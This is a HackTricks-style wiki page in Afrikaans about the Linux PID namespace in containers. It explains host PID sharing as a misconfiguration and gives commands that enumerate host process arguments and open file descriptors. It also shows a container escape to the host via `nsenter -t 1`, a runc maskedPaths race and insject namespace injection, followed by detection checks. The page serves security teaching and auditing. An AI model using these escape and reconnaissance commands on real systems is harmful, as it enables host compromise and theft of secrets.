# PID-naamruimte

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die PID-naamruimte beheer hoe prosesse genommer word en watter prosesse sigbaar is. Daarom kan 'n container sy eie PID 1 hê al is dit nie 'n werklike masjien nie. Binne die naamruimte sien die workload wat na 'n plaaslike prosesboom lyk. Buite die naamruimte sien die host steeds die werklike host-PIDs en die volledige proseslandskap.

Vanuit 'n sekuriteitsoogpunt is die PID-naamruimte belangrik omdat proses-sigbaarheid waardevol is. Sodra 'n workload host-prosesse kan sien, kan dit diensname, command-line arguments, geheime wat in prosesargumente deurgegee word, omgewingsafgeleide toestand via `/proc`, en potensiële namespace-entry teikens opmerk. As dit meer as net sien kan doen — byvoorbeeld deur seine te stuur of ptrace onder die regte toestande te gebruik — word die probleem baie ernstiger.

## Werking

'n Nuwe PID-naamruimte begin met sy eie interne prosesnommering. Die eerste proses wat daarin geskep word, word PID 1 vanuit die naamruimte se perspektief, wat ook beteken dit kry spesiale init-agtige semantiek vir verlate kinders en sein-gedrag. Dit verduidelik baie van die container-uitsonderlikhede rondom init-prosesse, zombie-opruiming, en hoekom klein init-wrappers soms in containers gebruik word.

Die belangrike sekuriteitsles is dat 'n proses geïsoleer kan lyk omdat dit slegs sy eie PID-boom sien, maar daardie isolasie kan doelbewus verwyder word. Docker stel dit beskikbaar deur `--pid=host`, terwyl Kubernetes dit doen met `hostPID: true`. Sodra die container by die host PID-naamruimte aansluit, sien die workload host-prosesse direk, en baie later aanvalspaaie raak baie realistieser.

## Laboratorium

Om 'n PID-naamruimte handmatig te skep:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die shell sien nou 'n private prosesuitsig. Die `--mount-proc` vlag is belangrik omdat dit 'n procfs instance mount wat ooreenstem met die nuwe PID namespace, en sodoende die proseslys van binne koherent maak.

Om container-gedrag te vergelyk:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Die verskil is onmiddellik en maklik om te verstaan, daarom is dit 'n goeie eerste lab vir lesers.

## Runtime-gebruik

Normale containers in Docker, Podman, containerd, en CRI-O kry hul eie PID-naamruimte. Kubernetes Pods ontvang gewoonlik ook 'n geïsoleerde PID-uitsig tensy die workload uitdruklik vra vir gasheer PID-deling. LXC/Incus-omgewings vertrou op dieselfde kernel-primitive, hoewel system-container-gevalle meer ingewikkelde prosesboome kan openbaar en meer debugging-afkortings aanmoedig.

Dieselfde reël geld oral: as die runtime gekies het om nie die PID-naamruimte te isoleer nie, is dit 'n doelbewuste vermindering van die containergrens.

## Miskonfigurasies

Die kanonieke miskonfigurasie is gasheer PID-deling. Span­ne regverdig dit dikwels vir debugging, monitoring, of diensbestuurs-gerief, maar dit moet altyd as 'n betekenisvolle sekuriteitsafwyking beskou word. Selfs al het die container geen onmiddellike skryfprimitief oor gasheerprosesse nie, kan sigbaarheid alleen baie oor die stelsel openbaar. Sodra vermoëns soos `CAP_SYS_PTRACE` of nuttige procfs-toegang bygevoeg word, brei die risiko aansienlik uit.

Nog 'n fout is om aan te neem dat omdat die workload standaard nie gasheerprosesse kan kill of ptrace nie, gasheer PID-deling daarom skadelos is. Daardie gevolgtrekking ignoreer die waarde van enumerasie, die beskikbaarheid van namespace-entry teikens, en die wyse waarop PID-sigbaarheid met ander verzwakte kontroles kombineer.

## Misbruik

As die gasheer PID-naamruimte gedeel word, kan 'n aanvaller gasheerprosesse inspekteer, prosesargumente insamel, interessante dienste identifiseer, kandidaat-PIDs vir `nsenter` lokaliseren, of proses-sigbaarheid kombineer met ptrace-verwante voorreg om by gasheer of naburige workloads in te meng. In sommige gevalle is dit genoeg om net die regte langlopende proses te sien om die res van die aanvalplan te herskik.

Die eerste praktiese stap is altyd om te bevestig dat gasheerprosesse regtig sigbaar is:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sodra host PIDs sigbaar is, word prosesargumente en namespace-entry teikens dikwels die nuttigste inligtingsbron:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
As `nsenter` beskikbaar is en voldoende voorregte bestaan, toets of 'n sigbare host process as 'n namespace bridge gebruik kan word:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selfs wanneer toegang geblokkeer is, is gedeelde host‑PID reeds waardevol omdat dit die diensindeling, runtime‑komponente en kandidaat‑geprivilegieerde prosesse openbaar wat as volgende geteiken kan word.

Die sigbaarheid van host‑PID maak ook die misbruik van file‑descriptors meer realisties. As ’n geprivilegieerde host‑proses of ’n naburige workload ’n sensitiewe lêer of socket oop het, mag die aanvaller in staat wees om `/proc/<pid>/fd/` te inspekteer en daardie handle te hergebruik, afhangend van eienaarskap, procfs mount options en die teikendiensmodel.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Hierdie opdragte is nuttig omdat dit aandui of `hidepid=1` of `hidepid=2` die kruis-proses sigbaarheid beperk, en of voor die hand liggende interessante descriptors, soos geopende geheime lêers, logs of Unix-sokette, te eniger tyd sigbaar is.

### Volledige Voorbeeld: host PID + `nsenter`

Host PID sharing word 'n direkte host escape wanneer die proses ook genoeg voorreg het om by die host namespaces aan te sluit:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Indien die opdrag slaag, word die container-proses nou uitgevoer in die host mount-, UTS-, network-, IPC- en PID-namespaces. Die impak is onmiddellike kompromittering van die host.

Selfs wanneer `nsenter` self ontbreek, kan dieselfde resultaat bereik word deur die host-binaire as die host filesystem gemount is:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Recent Runtime Notes

Sommige PID-namespace-verwante aanvalle is nie die tradisionele `hostPID: true` misconfigurasies nie, maar runtime-implementasiefoute rondom hoe procfs-beskerming tydens container-opstelling toegepas word.

#### `maskedPaths` race to host procfs

In kwesbare `runc`-weergawes kon aanvallers wat die container-image of die `runc exec`-werklaai beheer het, die maskeringsfase in 'n wedloop neem deur die container-kant van `/dev/null` te vervang met 'n symlink na 'n sensitiewe procfs-pad soos `/proc/sys/kernel/core_pattern`. As die wedloop suksesvol was, kon die gemaskerde-pad bind-mount op die verkeerde teiken beland en die gasheer se globale procfs-opsies aan die nuwe container blootstel.

Nuttige opdrag vir hersiening:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dit is belangrik omdat die uiteindelike impak dieselfde kan wees as 'n direkte procfs-blootstelling: skryfbare `core_pattern` of `sysrq-trigger`, gevolg deur uitvoering van gasheer-kode of diensweigering.

#### Naamruimte-inspuiting met `insject`

Instrumente vir naamruimte-inspuiting soos `insject` toon dat PID-namespace-interaksie nie altyd vereis dat jy vooraf die teiken-naamruimte betree voordat 'n proses geskep word nie. 'n helper kan later aanheg, `setns()` gebruik, en uitvoer terwyl sigbaarheid in die teiken PID-ruimte behou word:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Hierdie soort tegniek is hoofsaaklik relevant vir gevorderde foutopsporing, offensive tooling, en post-exploitation werkvloei waar namespace-konteks aangesluit moet word nadat die runtime reeds die workload geïnitialiseer het.

### Verwante FD-misbruikpatrone

Twee patrone is die moeite werd om eksplisiet uit te lig wanneer host PIDs sigbaar is. Eerstens kan ’n geprivilegieerde proses ’n sensitiewe file descriptor oop hou oor `execve()` omdat dit nie as `O_CLOEXEC` gemerk was nie. Tweedens kan dienste file descriptors oor Unix sockets deur `SCM_RIGHTS` deurgee. In beide gevalle is die interessante objek nie meer die padnaam nie, maar die reeds-opgemaakte handle wat ’n proses met laer bevoegdhede kan erf of ontvang.

Dit maak saak in container-werk omdat die handle na `docker.sock`, ’n geprivilegieerde log, ’n host geheime lêer, of ’n ander hoë-waarde objek kan wys, selfs wanneer die pad self nie direk vanaf die container filesystem bereikbaar is nie.

## Kontroles

Die doel van hierdie opdragte is om te bepaal of die proses ’n privaat PID-uitsig het of reeds ’n veel breër proses-landskap kan opnoem.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Wat hier interessant is:

- As die proseslys duidelike host-dienste bevat, is host PID sharing waarskynlik reeds in werking.
- Om slegs 'n klein container-lokaal boom te sien is die normale basislyn; om `systemd`, `dockerd`, of ander nie-verwante daemons te sien is dit nie.
- Sodra host PIDs sigbaar is, word selfs lees-alleen prosesinligting nuttige verkenning.

As jy 'n container ontdek wat met host PID sharing loop, behandel dit nie as 'n kosmetiese verskil nie. Dit is 'n groot verandering in wat die werkbelasting kan waarneem en moontlik beïnvloed.
